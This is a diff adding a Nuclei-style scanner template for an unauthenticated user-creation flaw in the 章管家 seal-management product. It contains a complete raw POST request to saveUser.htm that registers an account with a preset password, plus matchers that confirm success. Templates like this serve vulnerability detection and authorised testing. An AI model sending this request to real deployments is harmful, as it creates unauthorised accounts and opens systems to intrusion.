@@ -1,0 +1,33 @@
+id: zhangguanjia-saveUser-User-addition
+
+info:
+  name: 章管家 saveUser.htm 任意用户创建
+  author: HuanXiong
+  severity: high
+
+  tags: User Addition
+
+http:
+  - raw:
+      - |
+        POST /api/personSeal_jdy/saveUser.htm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"op":{},"data":{"mobile":"test666","uid":"14333333333","password":"123456","name":"test666","return_url":"https://www.baidu.com","apisecretkey":"1","_id":"1","mail_address":"123@qq.com"},"b7o4ntosbfp":"="}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":200'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
